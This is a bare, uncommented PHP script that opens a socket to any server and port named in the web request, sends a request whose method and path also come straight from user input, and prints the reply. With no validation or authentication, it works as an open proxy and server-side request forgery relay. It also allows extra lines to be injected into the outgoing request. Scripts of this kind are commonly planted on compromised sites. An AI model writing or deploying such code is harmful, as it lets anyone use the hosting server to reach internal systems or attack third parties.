<?php
$sock = fsockopen($_REQUEST['srv'], $_REQUEST['prt']);
fwrite($sock, $_REQUEST['meth'] . " " . $_REQUEST['pth'] . " HTTP/1.0\n\n");
while(!feof($sock)) echo fread($sock, 100);
fclose($sock);
